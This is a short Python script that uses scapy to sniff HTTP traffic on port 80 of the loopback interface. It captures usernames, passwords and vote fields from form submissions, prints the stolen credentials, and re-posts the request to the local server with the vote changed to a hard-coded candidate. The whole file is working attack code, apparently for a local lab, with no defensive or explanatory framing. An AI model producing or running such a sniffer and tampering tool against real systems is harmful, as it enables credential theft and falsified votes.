from scapy.all import *
import requests

url = 'http://127.0.0.1'
userField = 'user='
passField = 'pass='
voteField = 'vote='
desiredVote = '2'

payload = {
    'user' : '',
    'pass' : '',
    'vote' : ''
}

def http_header(packet):
    if Raw in packet:
        data = packet[Raw].load.decode()
        dataList = list(data)

        if userField in str(packet[Raw].load):
            index = data.find(userField)
            endIndex = data.find('&', index, len(data) - 1)
            scrapedUser = data[index + len(userField): endIndex]
            print("Username is: " + scrapedUser)
            payload['user'] = str(scrapedUser)
            print(payload['user'])

        if passField in str(packet[Raw].load):
            index = data.find(passField)
            endIndex = data.find('&', index, len(data) - 1)
            scrapedPass = data[index + len(passField): endIndex]
            print("Password is: " + scrapedPass)
            payload['pass'] = str(scrapedPass)
            print(payload['pass'])

        if voteField in str(packet[Raw].load):
            index = data.find(voteField)
            print("Original vote was for candidate " + dataList[index + len(voteField)])
            payload['vote'] = str(desiredVote)
            print("Changed vote to " + desiredVote)
            res = requests.post(url, data=payload)
            print(res.text)


sniff(iface='\\Device\\NPF_Loopback', prn=http_header, filter="port 80")
